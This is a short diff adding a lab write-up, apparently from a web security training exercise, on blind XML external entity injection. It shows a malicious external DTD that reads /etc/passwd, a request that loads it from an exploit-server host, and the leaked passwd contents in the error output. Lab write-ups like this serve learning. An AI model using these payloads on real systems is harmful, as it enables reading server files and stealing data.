@@ -1,0 +1,29 @@
+In order to do this lab you need an exploit server with the following file payload:
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+        %eval;
+        %error;
+
+
+Then you get the server to read from this URL using the payload of:
+<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a07003603b7d8a1824f55f5013d0090.exploit-server.net/exploit"> %xxe;]>
+    <stockCheck>
+        <productId>
+            1
+        </productId>
+        <storeId>
+            1
+        </storeId>
+    </stockCheck>
+
+This makes the server reach out to the malicious paylod in our exploit server and read the contents of the file 
+that we have named
+
+
+All this then leads to:
+"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync........
